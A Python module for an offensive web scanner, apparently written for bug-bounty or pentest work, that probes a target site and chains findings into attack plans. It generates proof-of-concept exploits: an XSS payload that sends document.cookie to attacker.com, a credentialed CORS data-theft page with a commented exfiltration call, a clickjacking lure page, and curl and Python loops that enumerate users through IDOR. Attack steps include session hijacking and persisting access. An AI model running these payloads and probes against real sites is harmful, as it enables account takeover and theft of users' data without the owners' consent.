"""
Multi-Situation Fusion Intelligence
====================================

An advanced system that analyzes MULTIPLE SITUATIONS SIMULTANEOUSLY
and finds hidden connections between them.

The key insight: Real vulnerabilities often emerge from the INTERACTION
of multiple seemingly unrelated observations.

Examples:
- Missing CSP + Error disclosure = Potential for reflected XSS with path leakage
- CORS misconfiguration + IDOR = Cross-origin account takeover
- Rate limiting + Error messages = Timing-based enumeration
- Open redirect + OAuth = Token theft via redirect manipulation

This system:
1. Observes multiple situations in parallel
2. Finds correlations and patterns
3. Generates hybrid attack strategies
4. Prioritizes based on compound probability

Author: canigetrichpls
"""

import asyncio
import json
import re
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple
from datetime import datetime
from itertools import combinations
import structlog

logger = structlog.get_logger(__name__)


# =============================================================================
# SITUATION MODELS
# =============================================================================

class SituationType(Enum):
    """Types of security situations we can observe."""
    # Header situations
    MISSING_CSP = auto()
    MISSING_XFRAME = auto()
    MISSING_HSTS = auto()
    WEAK_CORS = auto()
    PERMISSIVE_CORS = auto()
    
    # Response situations
    ERROR_LEAKAGE = auto()
    STACK_TRACE = auto()
    DEBUG_MODE = auto()
    VERSION_DISCLOSURE = auto()
    
    # Input situations
    REFLECTION_FOUND = auto()
    PARAM_POLLUTION = auto()
    TYPE_CONFUSION = auto()
    
    # Auth situations
    WEAK_SESSION = auto()
    PREDICTABLE_TOKENS = auto()
    NO_RATE_LIMIT = auto()
    
    # Logic situations
    IDOR_INDICATOR = auto()
    RACE_CONDITION = auto()
    BUSINESS_LOGIC_FLAW = auto()
    
    # Infrastructure
    WAF_DETECTED = auto()
    CDN_DETECTED = auto()
    CLOUD_HOSTING = auto()


@dataclass
class Situation:
    """A single observed situation."""
    type: SituationType
    confidence: float  # 0.0 to 1.0
    evidence: Dict[str, Any] = field(default_factory=dict)
    endpoint: str = ""
    timestamp: datetime = field(default_factory=datetime.now)


@dataclass
class SituationFusion:
    """A fusion of multiple situations into an attack opportunity."""
    name: str
    situations: List[Situation]
    attack_type: str
    
    # Scoring
    combined_probability: float = 0.0
    potential_impact: str = ""
    
    # Attack details
    attack_steps: List[str] = field(default_factory=list)
    required_conditions: List[str] = field(default_factory=list)
    
    # PoC
    poc_template: str = ""
    poc_params: Dict[str, Any] = field(default_factory=dict)


# =============================================================================
# FUSION RULES
# =============================================================================

# Define how situations combine into attack opportunities
FUSION_RULES: List[Dict] = [
    # =========================================================================
    # XSS FUSIONS
    # =========================================================================
    {
        "name": "CSP-less XSS Exploitation",
        "situations": [SituationType.MISSING_CSP, SituationType.REFLECTION_FOUND],
        "attack_type": "xss",
        "probability_boost": 1.5,
        "impact": "high",
        "description": "CSP missing allows unrestricted XSS execution",
        "attack_steps": [
            "1. Identify reflection point",
            "2. Craft XSS payload without CSP restrictions",
            "3. Execute arbitrary JavaScript",
            "4. Steal session/cookies",
        ],
    },
    {
        "name": "Error-Assisted XSS",
        "situations": [SituationType.ERROR_LEAKAGE, SituationType.REFLECTION_FOUND],
        "attack_type": "xss",
        "probability_boost": 1.3,
        "impact": "high",
        "description": "Error messages reveal injection context for precise XSS",
        "attack_steps": [
            "1. Trigger error to see injection context",
            "2. Craft context-aware XSS payload",
            "3. Bypass any partial filtering",
        ],
    },
    {
        "name": "WAF Bypass XSS",
        "situations": [SituationType.WAF_DETECTED, SituationType.REFLECTION_FOUND],
        "attack_type": "xss_bypass",
        "probability_boost": 0.8,
        "impact": "high",
        "description": "WAF detected but reflection exists - bypass possible",
        "attack_steps": [
            "1. Identify WAF type from signatures",
            "2. Test known bypass techniques",
            "3. Use encoding/obfuscation",
            "4. Find filter gaps",
        ],
    },
    
    # =========================================================================
    # CLICKJACKING FUSIONS
    # =========================================================================
    {
        "name": "Clickjacking Attack",
        "situations": [SituationType.MISSING_XFRAME],
        "attack_type": "clickjacking",
        "probability_boost": 1.0,
        "impact": "medium",
        "description": "Page can be framed for UI redressing attacks",
        "attack_steps": [
            "1. Create malicious page with iframe",
            "2. Overlay transparent elements",
            "3. Trick user into clicking",
        ],
    },
    {
        "name": "Clickjacking + CSRF Chain",
        "situations": [SituationType.MISSING_XFRAME, SituationType.WEAK_SESSION],
        "attack_type": "clickjacking_csrf",
        "probability_boost": 1.4,
        "impact": "high",
        "description": "Clickjack sensitive actions without CSRF protection",
        "attack_steps": [
            "1. Identify sensitive action (delete, transfer, etc.)",
            "2. Create clickjacking PoC",
            "3. Trick user into performing action",
        ],
    },
    
    # =========================================================================
    # CORS FUSIONS
    # =========================================================================
    {
        "name": "CORS Data Theft",
        "situations": [SituationType.WEAK_CORS],
        "attack_type": "cors",
        "probability_boost": 1.0,
        "impact": "high",
        "description": "CORS allows cross-origin data theft",
        "attack_steps": [
            "1. Create malicious page on attacker domain",
            "2. Use fetch with credentials",
            "3. Exfiltrate user data",
        ],
    },
    {
        "name": "CORS + IDOR = Account Takeover",
        "situations": [SituationType.WEAK_CORS, SituationType.IDOR_INDICATOR],
        "attack_type": "cors_idor",
        "probability_boost": 1.6,
        "impact": "critical",
        "description": "Combine CORS with IDOR for cross-origin account access",
        "attack_steps": [
            "1. Use CORS to access API cross-origin",
            "2. Enumerate user IDs via IDOR",
            "3. Access other users' data",
            "4. Potential account takeover",
        ],
    },
    {
        "name": "CORS + Error Disclosure",
        "situations": [SituationType.WEAK_CORS, SituationType.ERROR_LEAKAGE],
        "attack_type": "cors_info",
        "probability_boost": 1.3,
        "impact": "high",
        "description": "CORS enables cross-origin error harvesting",
        "attack_steps": [
            "1. Trigger errors via CORS requests",
            "2. Harvest sensitive error information",
            "3. Use for further attacks",
        ],
    },
    
    # =========================================================================
    # AUTHENTICATION FUSIONS
    # =========================================================================
    {
        "name": "Brute Force via No Rate Limit",
        "situations": [SituationType.NO_RATE_LIMIT, SituationType.WEAK_SESSION],
        "attack_type": "brute_force",
        "probability_boost": 1.4,
        "impact": "high",
        "description": "No rate limiting allows credential brute forcing",
        "attack_steps": [
            "1. Identify login endpoint",
            "2. Verify no rate limiting",
            "3. Perform credential stuffing",
        ],
    },
    {
        "name": "Session Prediction Attack",
        "situations": [SituationType.PREDICTABLE_TOKENS, SituationType.WEAK_SESSION],
        "attack_type": "session_prediction",
        "probability_boost": 1.5,
        "impact": "critical",
        "description": "Predictable session tokens allow hijacking",
        "attack_steps": [
            "1. Collect multiple session tokens",
            "2. Analyze patterns",
            "3. Predict valid tokens",
            "4. Hijack sessions",
        ],
    },
    
    # =========================================================================
    # IDOR FUSIONS
    # =========================================================================
    {
        "name": "IDOR Exploitation",
        "situations": [SituationType.IDOR_INDICATOR],
        "attack_type": "idor",
        "probability_boost": 1.0,
        "impact": "high",
        "description": "Direct object reference manipulation possible",
        "attack_steps": [
            "1. Identify numeric/predictable IDs",
            "2. Modify ID values",
            "3. Access other users' resources",
        ],
    },
    {
        "name": "IDOR + Error = Enumeration",
        "situations": [SituationType.IDOR_INDICATOR, SituationType.ERROR_LEAKAGE],
        "attack_type": "idor_enum",
        "probability_boost": 1.4,
        "impact": "high",
        "description": "Error messages confirm IDOR and enable enumeration",
        "attack_steps": [
            "1. Test IDOR with different IDs",
            "2. Use error messages to confirm valid/invalid",
            "3. Enumerate all accessible resources",
        ],
    },
    {
        "name": "IDOR + Debug Mode",
        "situations": [SituationType.IDOR_INDICATOR, SituationType.DEBUG_MODE],
        "attack_type": "idor_debug",
        "probability_boost": 1.5,
        "impact": "critical",
        "description": "Debug mode reveals internal IDs for IDOR",
        "attack_steps": [
            "1. Use debug info to find internal IDs",
            "2. Map ID patterns",
            "3. Access any resource via IDOR",
        ],
    },
    
    # =========================================================================
    # INJECTION FUSIONS
    # =========================================================================
    {
        "name": "Error-Based SQL Injection",
        "situations": [SituationType.ERROR_LEAKAGE, SituationType.STACK_TRACE],
        "attack_type": "sqli_error",
        "probability_boost": 1.5,
        "impact": "critical",
        "description": "Error messages reveal SQL context for injection",
        "attack_steps": [
            "1. Analyze error messages for SQL syntax",
            "2. Craft injection payload",
            "3. Extract data via errors",
        ],
    },
    {
        "name": "Type Confusion Injection",
        "situations": [SituationType.TYPE_CONFUSION, SituationType.ERROR_LEAKAGE],
        "attack_type": "type_injection",
        "probability_boost": 1.3,
        "impact": "high",
        "description": "Type confusion enables injection attacks",
        "attack_steps": [
            "1. Identify type-confused parameters",
            "2. Send unexpected types",
            "3. Trigger injection via type mismatch",
        ],
    },
    
    # =========================================================================
    # COMPLEX MULTI-SITUATION FUSIONS
    # =========================================================================
    {
        "name": "Full Chain: XSS → Session → Account",
        "situations": [
            SituationType.MISSING_CSP,
            SituationType.REFLECTION_FOUND,
            SituationType.WEAK_SESSION,
        ],
        "attack_type": "full_chain_xss",
        "probability_boost": 1.8,
        "impact": "critical",
        "description": "Complete attack chain from XSS to account takeover",
        "attack_steps": [
            "1. Exploit XSS (no CSP blocking)",
            "2. Steal session token",
            "3. Hijack user account",
            "4. Persist access",
        ],
    },
    {
        "name": "Full Chain: CORS → IDOR → Takeover",
        "situations": [
            SituationType.WEAK_CORS,
            SituationType.IDOR_INDICATOR,
            SituationType.NO_RATE_LIMIT,
        ],
        "attack_type": "full_chain_cors",
        "probability_boost": 1.9,
        "impact": "critical",
        "description": "Complete attack chain via CORS misconfiguration",
        "attack_steps": [
            "1. Use CORS to make cross-origin requests",
            "2. Enumerate users via IDOR (no rate limit)",
            "3. Access any user's data",
            "4. Modify user accounts",
        ],
    },
    {
        "name": "Recon Chain: Errors → Debug → Exploit",
        "situations": [
            SituationType.ERROR_LEAKAGE,
            SituationType.DEBUG_MODE,
            SituationType.VERSION_DISCLOSURE,
        ],
        "attack_type": "recon_chain",
        "probability_boost": 1.4,
        "impact": "medium",
        "description": "Information disclosure enables targeted exploitation",
        "attack_steps": [
            "1. Collect error messages",
            "2. Identify framework/version",
            "3. Search for known CVEs",
            "4. Execute targeted exploit",
        ],
    },
    {
        "name": "Cloud Misconfiguration Chain",
        "situations": [
            SituationType.CLOUD_HOSTING,
            SituationType.ERROR_LEAKAGE,
            SituationType.WEAK_CORS,
        ],
        "attack_type": "cloud_chain",
        "probability_boost": 1.5,
        "impact": "critical",
        "description": "Cloud misconfiguration combined with other issues",
        "attack_steps": [
            "1. Identify cloud provider",
            "2. Test for metadata access",
            "3. Use CORS for credential theft",
            "4. Access cloud resources",
        ],
    },
]


# =============================================================================
# MULTI-SITUATION FUSION ENGINE
# =============================================================================

class MultiSituationFusion:
    """
    Analyzes multiple situations simultaneously and finds attack opportunities.
    """
    
    def __init__(self, http_client=None, rate_limiter=None):
        self.http_client = http_client
        self.rate_limiter = rate_limiter
        self.situations: List[Situation] = []
        self.fusions: List[SituationFusion] = []
    
    async def analyze(
        self,
        target_url: str,
        initial_findings: List[dict] = None,
    ) -> Tuple[List[SituationFusion], str]:
        """
        Analyze target and find situation fusions.
        
        Returns:
            Tuple of (fusions, report)
        """
        initial_findings = initial_findings or []
        
        logger.info(f"[Fusion] Starting multi-situation analysis: {target_url}")
        
        # Phase 1: Detect situations from findings
        self.situations = self._findings_to_situations(initial_findings)
        
        # Phase 2: Active situation detection
        if self.http_client:
            active_situations = await self._detect_situations_actively(target_url)
            self.situations.extend(active_situations)
        
        logger.info(f"[Fusion] Detected {len(self.situations)} situations")
        
        # Phase 3: Find all possible fusions
        self.fusions = self._find_fusions()
        
        logger.info(f"[Fusion] Found {len(self.fusions)} attack opportunities")
        
        # Phase 4: Score and rank fusions
        self._score_fusions()
        
        # Phase 5: Generate PoCs for top fusions
        await self._generate_pocs(target_url)
        
        # Generate report
        report = self._generate_report(target_url)
        
        return self.fusions, report
    
    def _findings_to_situations(self, findings: List[dict]) -> List[Situation]:
        """Convert findings to situations."""
        situations = []
        
        for finding in findings:
            ftype = finding.get("type", "").lower()
            fname = finding.get("name", "").lower()
            severity = finding.get("severity", "").lower()
            
            # Map findings to situations
            mappings = [
                (["csp", "content-security"], SituationType.MISSING_CSP),
                (["x-frame", "clickjack"], SituationType.MISSING_XFRAME),
                (["hsts", "transport"], SituationType.MISSING_HSTS),
                (["cors"], SituationType.WEAK_CORS),
                (["error", "exception", "stack"], SituationType.ERROR_LEAKAGE),
                (["debug"], SituationType.DEBUG_MODE),
                (["version", "server"], SituationType.VERSION_DISCLOSURE),
                (["reflection", "xss"], SituationType.REFLECTION_FOUND),
                (["idor", "insecure direct"], SituationType.IDOR_INDICATOR),
                (["rate", "limit", "throttl"], SituationType.NO_RATE_LIMIT),
                (["session", "cookie"], SituationType.WEAK_SESSION),
                (["token", "jwt", "predictable"], SituationType.PREDICTABLE_TOKENS),
                (["waf", "firewall"], SituationType.WAF_DETECTED),
                (["cdn", "cloudflare", "akamai"], SituationType.CDN_DETECTED),
                (["aws", "azure", "gcp", "cloud"], SituationType.CLOUD_HOSTING),
            ]
            
            for keywords, situation_type in mappings:
                if any(kw in ftype or kw in fname for kw in keywords):
                    situations.append(Situation(
                        type=situation_type,
                        confidence=self._severity_to_confidence(severity),
                        evidence=finding,
                        endpoint=finding.get("url", finding.get("endpoint", "")),
                    ))
        
        return situations
    
    def _severity_to_confidence(self, severity: str) -> float:
        """Convert severity to confidence score."""
        return {
            "critical": 0.95,
            "high": 0.85,
            "medium": 0.70,
            "low": 0.50,
            "info": 0.30,
        }.get(severity.lower(), 0.50)
    
    async def _detect_situations_actively(self, url: str) -> List[Situation]:
        """Actively detect situations via HTTP requests."""
        situations = []
        
        try:
            if self.rate_limiter:
                await self.rate_limiter.acquire()
            
            response = await self.http_client.get(url)
            headers = {k.lower(): v for k, v in response.headers.items()}
            
            # Check for missing security headers
            if "content-security-policy" not in headers:
                situations.append(Situation(
                    type=SituationType.MISSING_CSP,
                    confidence=0.95,
                    evidence={"header": "Content-Security-Policy", "status": "missing"},
                    endpoint=url,
                ))
            
            if "x-frame-options" not in headers and "frame-ancestors" not in headers.get("content-security-policy", ""):
                situations.append(Situation(
                    type=SituationType.MISSING_XFRAME,
                    confidence=0.95,
                    evidence={"header": "X-Frame-Options", "status": "missing"},
                    endpoint=url,
                ))
            
            if "strict-transport-security" not in headers:
                situations.append(Situation(
                    type=SituationType.MISSING_HSTS,
                    confidence=0.90,
                    evidence={"header": "Strict-Transport-Security", "status": "missing"},
                    endpoint=url,
                ))
            
            # Check CORS
            acao = headers.get("access-control-allow-origin", "")
            if acao == "*" or "null" in acao:
                situations.append(Situation(
                    type=SituationType.WEAK_CORS,
                    confidence=0.95,
                    evidence={"ACAO": acao},
                    endpoint=url,
                ))
            
            # Test reflection
            canary = f"FUSION_PROBE_{hash(url) % 10000}"
            test_url = f"{url}{'&' if '?' in url else '?'}test={canary}"
            
            if self.rate_limiter:
                await self.rate_limiter.acquire()
            
            test_response = await self.http_client.get(test_url)
            if canary in test_response.text:
                situations.append(Situation(
                    type=SituationType.REFLECTION_FOUND,
                    confidence=0.85,
                    evidence={"canary": canary, "reflected": True},
                    endpoint=test_url,
                ))
            
            # Check for error disclosure
            error_url = f"{url}?id='"
            if self.rate_limiter:
                await self.rate_limiter.acquire()
            
            error_response = await self.http_client.get(error_url)
            error_patterns = [
                r"error", r"exception", r"syntax", r"sql",
                r"warning", r"notice", r"undefined",
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, error_response.text, re.I):
                    situations.append(Situation(
                        type=SituationType.ERROR_LEAKAGE,
                        confidence=0.75,
                        evidence={"pattern": pattern},
                        endpoint=error_url,
                    ))
                    break
            
            # Check for debug mode
            if any(d in error_response.text.lower() for d in ["debug", "stack trace", "traceback"]):
                situations.append(Situation(
                    type=SituationType.DEBUG_MODE,
                    confidence=0.80,
                    evidence={"indicator": "debug/stack trace present"},
                    endpoint=error_url,
                ))
            
        except Exception as e:
            logger.error(f"[Fusion] Active detection error: {e}")
        
        return situations
    
    def _find_fusions(self) -> List[SituationFusion]:
        """Find all possible fusions from detected situations."""
        fusions = []
        situation_types = set(s.type for s in self.situations)
        
        for rule in FUSION_RULES:
            required = set(rule["situations"])
            
            # Check if all required situations are present
            if required <= situation_types:
                # Get matching situations
                matching = [s for s in self.situations if s.type in required]
                
                fusion = SituationFusion(
                    name=rule["name"],
                    situations=matching,
                    attack_type=rule["attack_type"],
                    potential_impact=rule["impact"],
                    attack_steps=rule.get("attack_steps", []),
                )
                
                # Calculate combined probability
                base_prob = sum(s.confidence for s in matching) / len(matching)
                fusion.combined_probability = base_prob * rule.get("probability_boost", 1.0)
                fusion.combined_probability = min(fusion.combined_probability, 1.0)
                
                fusions.append(fusion)
        
        return fusions
    
    def _score_fusions(self):
        """Score and sort fusions by priority."""
        # Impact weights
        impact_weights = {
            "critical": 1.0,
            "high": 0.8,
            "medium": 0.5,
            "low": 0.3,
        }
        
        for fusion in self.fusions:
            impact_weight = impact_weights.get(fusion.potential_impact, 0.5)
            fusion.combined_probability *= impact_weight
        
        # Sort by combined score
        self.fusions.sort(key=lambda f: f.combined_probability, reverse=True)
    
    async def _generate_pocs(self, target_url: str):
        """Generate PoCs for top fusions."""
        poc_generators = {
            "xss": self._generate_xss_poc,
            "xss_bypass": self._generate_xss_poc,
            "clickjacking": self._generate_clickjacking_poc,
            "clickjacking_csrf": self._generate_clickjacking_poc,
            "cors": self._generate_cors_poc,
            "cors_idor": self._generate_cors_poc,
            "idor": self._generate_idor_poc,
        }
        
        for fusion in self.fusions[:10]:  # Top 10
            generator = poc_generators.get(fusion.attack_type)
            if generator:
                fusion.poc_template = generator(target_url, fusion)
    
    def _generate_xss_poc(self, url: str, fusion: SituationFusion) -> str:
        """Generate XSS PoC."""
        return f"""<!DOCTYPE html>
<html>
<head><title>XSS PoC - {fusion.name}</title></head>
<body>
<h1>{fusion.name}</h1>
<h2>Attack Type: {fusion.attack_type}</h2>

<h3>Situations Combined:</h3>
<ul>
{"".join(f"<li>{s.type.name}: {s.confidence:.0%} confidence</li>" for s in fusion.situations)}
</ul>

<h3>Attack Steps:</h3>
<ol>
{"".join(f"<li>{step}</li>" for step in fusion.attack_steps)}
</ol>

<h3>Test Payload:</h3>
<pre>&lt;script&gt;alert(document.domain)&lt;/script&gt;</pre>

<h3>Direct Test Link:</h3>
<a href="{url}?test=%3Cscript%3Ealert(1)%3C/script%3E" target="_blank">Click to test</a>

<h3>Session Theft Payload:</h3>
<pre>&lt;script&gt;fetch('https://attacker.com/?c='+document.cookie)&lt;/script&gt;</pre>
</body>
</html>"""
    
    def _generate_clickjacking_poc(self, url: str, fusion: SituationFusion) -> str:
        """Generate Clickjacking PoC."""
        return f"""<!DOCTYPE html>
<html>
<head>
<title>Clickjacking PoC - {fusion.name}</title>
<style>
body {{ font-family: Arial; margin: 20px; }}
.container {{ position: relative; width: 100%; height: 500px; }}
iframe {{ 
    position: absolute;
    width: 100%;
    height: 100%;
    opacity: 0.3;
    z-index: 2;
    border: 2px dashed red;
}}
.bait {{
    position: absolute;
    z-index: 1;
    top: 100px;
    left: 50px;
    background: #4CAF50;
    color: white;
    padding: 20px 40px;
    font-size: 24px;
    cursor: pointer;
    border-radius: 5px;
}}
</style>
</head>
<body>
<h1>Clickjacking PoC - {fusion.name}</h1>

<h2>Combined Situations:</h2>
<ul>
{"".join(f"<li>{s.type.name}</li>" for s in fusion.situations)}
</ul>

<h2>Demonstration:</h2>
<p><em>The iframe opacity is 0.3 for visibility. In real attack it would be 0.0001</em></p>

<div class="container">
    <div class="bait">🎁 Click for FREE Gift!</div>
    <iframe src="{url}"></iframe>
</div>

<h2>Attack Steps:</h2>
<ol>
{"".join(f"<li>{step}</li>" for step in fusion.attack_steps)}
</ol>
</body>
</html>"""
    
    def _generate_cors_poc(self, url: str, fusion: SituationFusion) -> str:
        """Generate CORS PoC."""
        return f"""<!DOCTYPE html>
<html>
<head><title>CORS PoC - {fusion.name}</title></head>
<body>
<h1>CORS Data Theft PoC - {fusion.name}</h1>

<h2>Combined Situations:</h2>
<ul>
{"".join(f"<li>{s.type.name}</li>" for s in fusion.situations)}
</ul>

<button onclick="exploit()">Exploit CORS</button>
<pre id="output">Click button to steal data...</pre>

<script>
async function exploit() {{
    try {{
        const response = await fetch('{url}', {{
            credentials: 'include'
        }});
        const data = await response.text();
        document.getElementById('output').textContent = 'STOLEN DATA:\\n' + data;
        
        // Exfiltrate
        // fetch('https://attacker.com/collect', {{method:'POST', body:data}});
    }} catch(e) {{
        document.getElementById('output').textContent = 'Error: ' + e;
    }}
}}
</script>

<h2>Attack Steps:</h2>
<ol>
{"".join(f"<li>{step}</li>" for step in fusion.attack_steps)}
</ol>
</body>
</html>"""
    
    def _generate_idor_poc(self, url: str, fusion: SituationFusion) -> str:
        """Generate IDOR PoC."""
        return f"""# IDOR Exploitation PoC - {fusion.name}

## Combined Situations:
{"".join(f"- {s.type.name}\\n" for s in fusion.situations)}

## Curl Commands:

# Test with your ID (should work)
curl -H "Cookie: session=YOUR_SESSION" "{url}?user_id=YOUR_ID"

# Test with another user's ID (shouldn't work but does)
curl -H "Cookie: session=YOUR_SESSION" "{url}?user_id=VICTIM_ID"

# Enumeration loop
for i in $(seq 1 100); do
    curl -s -H "Cookie: session=YOUR_SESSION" "{url}?user_id=$i" | grep -q "success" && echo "Valid: $i"
done

## Python Exploitation Script:

```python
import requests

session = "YOUR_SESSION"
base_url = "{url}"

for user_id in range(1, 1000):
    resp = requests.get(f"{{base_url}}?user_id={{user_id}}", cookies={{"session": session}})
    if resp.status_code == 200 and "data" in resp.text:
        print(f"[+] Found user {{user_id}}: {{resp.text[:100]}}")
```

## Attack Steps:
{"".join(f"{i+1}. {step}\\n" for i, step in enumerate(fusion.attack_steps))}
"""
    
    def _generate_report(self, target_url: str) -> str:
        """Generate comprehensive fusion report."""
        report = f"""# 🔀 Multi-Situation Fusion Analysis

## Target: {target_url}

## Situations Detected

| Type | Confidence | Endpoint |
|------|------------|----------|
"""
        for s in self.situations:
            endpoint_short = s.endpoint[:40] + "..." if len(s.endpoint) > 40 else s.endpoint
            report += f"| {s.type.name} | {s.confidence:.0%} | {endpoint_short} |\n"
        
        report += f"""
## Attack Opportunities (Fusions)

Found **{len(self.fusions)}** attack opportunities from situation combinations:

"""
        
        for i, fusion in enumerate(self.fusions, 1):
            situations_str = " + ".join(s.type.name for s in fusion.situations)
            
            report += f"""### {i}. {fusion.name}

**Type:** {fusion.attack_type}
**Impact:** {fusion.potential_impact.upper()}
**Probability:** {fusion.combined_probability:.0%}

**Situations Combined:**
{situations_str}

**Attack Steps:**
"""
            for step in fusion.attack_steps:
                report += f"- {step}\n"
            
            if fusion.poc_template:
                report += f"""
**Proof of Concept:**
```html
{fusion.poc_template[:2000]}
```
"""
            report += "\n---\n\n"
        
        if not self.fusions:
            report += """
_No attack opportunities found from situation combinations._

This could mean:
- The target has good security posture
- More reconnaissance is needed
- Situations detected don't combine into known attack patterns
"""
        
        return report


# =============================================================================
# MAIN ENTRY POINT
# =============================================================================

async def analyze_multiple_situations(
    target_url: str,
    initial_findings: List[dict] = None,
    http_client=None,
    rate_limiter=None,
) -> Tuple[List[SituationFusion], str]:
    """
    Analyze multiple situations and find attack opportunities.
    
    Returns:
        Tuple of (fusions, report)
    """
    fusion_engine = MultiSituationFusion(http_client, rate_limiter)
    return await fusion_engine.analyze(target_url, initial_findings or [])
